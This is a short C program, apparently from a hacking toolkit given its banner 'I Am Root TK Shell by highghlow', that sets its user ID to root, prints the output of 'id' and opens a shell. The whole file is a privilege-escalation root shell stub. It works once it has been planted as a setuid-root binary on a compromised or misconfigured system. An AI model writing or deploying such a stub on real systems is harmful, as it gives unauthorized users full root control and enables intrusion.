#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
    
int main()
{
    setuid(0);
    printf("### I Am Root TK Shell by highghlow ##\n");
    system("id");
    system("sh");
    return 0;
}